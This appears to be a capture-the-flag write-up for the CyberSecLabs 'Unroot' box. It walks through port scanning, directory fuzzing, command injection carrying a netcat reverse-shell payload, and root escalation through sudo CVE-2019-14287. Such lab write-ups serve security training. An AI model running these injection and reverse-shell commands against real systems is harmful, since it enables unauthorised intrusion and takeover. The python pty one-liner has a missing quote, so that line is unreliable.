#CyberSecLabs : Unroot

```zsh
nmap -sC -sV -p 22,80 172.31.1.17 -v
```
Nothing special, ssh and website. Directory fuzz it.

```zsh
python3 /root/dirsearch/dirsearch.py -u http://172.31.1.17:80 -e r -R 3
```

Interesting dir ```[07:38:15] 200 -    1KB - /dev/```
It has OS command injection

Enter an IP and a basic command to see if we have command exec
```
10.10.0.40 && whoami
```

You will see the command executes.Now,we will get a shell.

```
10.10.0.40 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.40 443 >/tmp/f
```

Spawn a tty shell using ```python -c 'import pty;pty.spawn("/bin/bash)'```

Now you will have a shell as ```joe```. 
Do a ```sudo -l``` and you will notice this

```
(ALL, !root) NOPASSWD: ALL
```
!root - notice that ? weird, it means you joe can run anything as any user as root. But this has vuln and it is the ```CVE-2019-14287```

```zsh
sudo -u#-1 bash  
```

For more reading on this vuln look for:
https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287

Cheers !